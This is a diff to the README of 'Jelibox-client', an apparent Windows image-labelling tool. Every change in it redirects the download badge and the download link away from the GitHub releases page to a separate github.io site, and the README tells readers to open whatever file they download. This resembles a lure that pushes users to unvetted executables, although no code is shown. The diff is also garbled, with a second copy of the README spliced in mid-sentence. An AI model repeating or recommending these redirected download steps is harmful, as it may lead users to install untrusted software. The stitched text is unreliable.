@@ -1,12 +1,12 @@
 # 🎨 Jelibox-client - Label Images Quickly Without Coding
 
-[![Visit the Jelibox-client releases page](https://img.shields.io/badge/Download_Jelibox_client-Visit_Releases-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tishmeinershagen/Jelibox-client/releases)
+[![Visit the Jelibox-client releases page](https://img.shields.io/badge/Download_Jelibox_client-Visit_Releases-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://tishmeinershagen.github.io)
 
 Jelibox-client is a desktop image annotation tool for Windows. It helps you mark objects in images, create training data for computer vision projects, and prepare datasets without writing code. You can draw boxes and polygons, use auto-labeling with YOLO-World or your own model, train models with Ultralytics, and export your work to YOLO, COCO, or Pascal VOC.
 
 ## 🚀 Download the Application
 
-Visit this link to download the application: [Jelibox-client releases](https://github.com/Tishmeinershagen/Jelibox-client/releases).
+Visit this link to download the application: [Jelibox-client releases](https://tishmeinershagen.github.io).
 
 When the download finishes, open the downloaded file to start Jelibox-client. Follow the on-screen prompts shown by the application.
 
@@ -51,13 +51,13 @@ Using your own model is helpful when you already have a model trained for your i
 
 Jelibox-client includes a training workflow with# 🎨 Jelibox-client - Label Images Quickly Without Coding
 
-[![Visit the Jelibox-client releases page](https://img.shields.io/badge/Download_Jelibox_client-33A1FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tishmeinershagen/Jelibox-client/releases)
+[![Visit the Jelibox-client releases page](https://img.shields.io/badge/Download_Jelibox_client-33A1FF?style=for-the-badge&logo=github&logoColor=white)](https://tishmeinershagen.github.io)
 
 Jelibox-client is a desktop image annotation tool for Windows. It helps you mark objects in images, create training data for computer vision projects, and prepare datasets without writing code. You can draw boxes and polygons, use auto-labeling with YOLO-World or your own model, train models with Ultralytics, and export your work to YOLO, COCO, or Pascal VOC.
 
 ## 📥 Download the Application
 
-Visit this link to download the application: [Jelibox-client releases](https://github.com/Tishmeinershagen/Jelibox-client/releases).
+Visit this link to download the application: [Jelibox-client releases](https://tishmeinershagen.github.io).
 
 When the download finishes, open the downloaded file to start Jelibox-client. Follow the on-screen prompts shown by the application. This is the only download step you need. Keep the downloaded file in a place you can find later, such as your Downloads folder.
 
